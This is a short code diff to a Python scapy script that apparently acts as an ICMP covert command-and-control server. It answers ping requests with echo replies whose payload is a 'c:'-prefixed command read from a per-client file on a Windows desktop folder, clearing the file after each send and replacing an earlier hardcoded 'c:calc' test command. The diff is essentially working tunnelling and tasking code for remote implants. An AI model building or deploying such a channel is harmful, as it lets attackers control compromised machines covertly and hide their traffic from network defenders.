@@ -1,8 +1,14 @@
 from scapy.all import *
+import re
 
 def handle_load(load):
     try:
-        return "c:" + open("./data/%s" % load,"r").read().strip()
+        f = open(f"C://Users/Clicker/Desktop/ICMP/{load}.txt","r", encoding='UTF-16')
+        command = "c:" + f.read().strip()
+        f.close()
+        print(command);
+        open(f"C://Users/Clicker/Desktop/ICMP/{load}.txt","w").close()
+        return command;
     except:
         return ""
 
@@ -11,12 +17,12 @@ def handle_ping(pkt):
         try:
             dst=pkt[1].dst
             src=pkt[1].src
-            seq = pkt[2].seq
-            id = pkt[2].id
-            load=pkt[3].load
+            seq=pkt[2].seq
+            id=pkt[2].id
+            load = pkt[3].load.decode('UTF-8')
             print(load)
-            reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/"c:calc"
-            #reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/handle_load(load)
+            response = handle_load(load)
+            reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/response
             send(reply,verbose=False)
         except:
             pass
